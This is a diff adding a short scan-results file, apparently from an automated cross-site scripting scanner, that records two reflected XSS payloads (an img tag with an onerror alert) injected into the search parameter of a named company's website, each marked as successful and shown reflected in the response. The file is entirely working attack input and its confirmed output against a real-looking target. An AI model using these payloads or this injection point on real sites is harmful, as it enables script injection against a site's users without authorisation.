@@ -1,0 +1,16 @@
+Demo_presentation/.zentechnologies.com
+
+https://www.zentechnologies.com/search/search.php?query=<img src=x onerror='alert`1`'>&search=1
+Context = HTML
+Success = TRUE
+Detection:
+b"<q><img src=x onerror='alert`1`'></q>"
+
+-----------------------------------------------------------------------------------------------------
+https://www.zentechnologies.com/search/search.php?query=<img src=x onerror="alert`1`">&search=1
+Context = HTML
+Success = TRUE
+Detection:
+b'<q><img src=x onerror="alert`1`"></q>'
+
+-----------------------------------------------------------------------------------------------------
